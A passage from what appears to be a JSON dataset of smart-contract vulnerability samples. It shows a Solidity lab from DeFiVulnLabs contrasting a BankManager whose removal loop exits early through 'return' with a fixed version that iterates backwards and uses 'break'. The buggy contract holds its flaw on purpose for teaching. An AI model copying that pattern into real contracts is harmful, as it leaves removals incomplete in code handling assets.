addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\ncontract BuggyBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // BUG: Using 'return' causes premature exit after removing only one bank\n    function removeBanksWithReturn(address[] memory banksToRemove) public {\n        for (uint i = 0; i < banks.length; i++) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[i].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[i].bankName, \n                        \" (Address: \", toHexString(uint160(banks[i].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(i);\n                    return; // BUG: This exits the entire function after removing just one bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in buggy manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n\n// Fixed implementation using proper iteration\ncontract FixedBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // FIXED: Using proper iteration to remove multiple elements\n    function removeBanksWithBreak(address[] memory banksToRemove) public {\n        // We need to iterate backwards to avoid index issues when removing elements\n        for (int i = int(banks.length) - 1; i >= 0; i--) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[uint(i)].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[uint(i)].bankName, \n                        \" (Address: \", toHexString(uint160(banks[uint(i)].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(uint(i));\n                    break; // FIXED: Only break from the inner loop, continue with the next bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in fixed manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/return-break.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  }
]